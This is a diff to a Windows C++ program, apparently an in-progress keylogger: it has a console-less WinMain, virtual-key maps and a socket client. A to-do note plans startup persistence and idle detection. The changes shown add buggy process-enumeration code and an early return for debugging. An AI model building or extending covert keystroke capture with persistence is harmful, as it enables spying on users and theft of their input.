@@ -19,10 +19,32 @@
 #include <fstream>
 #include <thread>
 #include <winsock2.h>
+#include <psapi.h>
+
+int retrieveProcessName(DWORD procID) 
+{
+    char procName[1024];
+    HMODULE hMod;
+    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
+    if (procHandle) 
+    {
+        GetModuleBaseNameA(procHandle, hMod, procName, sizeof(procName)/sizeof(char));
+        //std::cout << GetLastError() << '\n';
+    }
+    std::cout << procName << '\n';
+    CloseHandle(procHandle);
+    return 1;
+}
 
 int isProcRunning() 
 {
-    //EnumProcesses(&x, sizeof(std::vector), )
+    DWORD procIDs[1024];
+    DWORD cbNeeded;
+    EnumProcesses(procIDs, sizeof(procIDs), &cbNeeded);
+    for (int i = 1; procIDs[i] != 0; i++) 
+    {
+        retrieveProcessName(procIDs[i]);
+    }
     return 0;
 }
 
@@ -50,6 +72,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
     isProcRunning();
+    return 1;
     Maps vkMaps;
     SOCKET sObjClient = initClient();
     vkMaps.initializeMaps();
@@ -99,6 +122,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
         To-Do list
     ~ create a function to check if the code program is already running. 
+        plan: create a local counter variable, IF counter is >= 2 then the program must exit as that means there is more than one instance of it. 
+
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
     ~ implement code algorithm to check if user is idle, if so then exit the loop and wait til mouse moves.
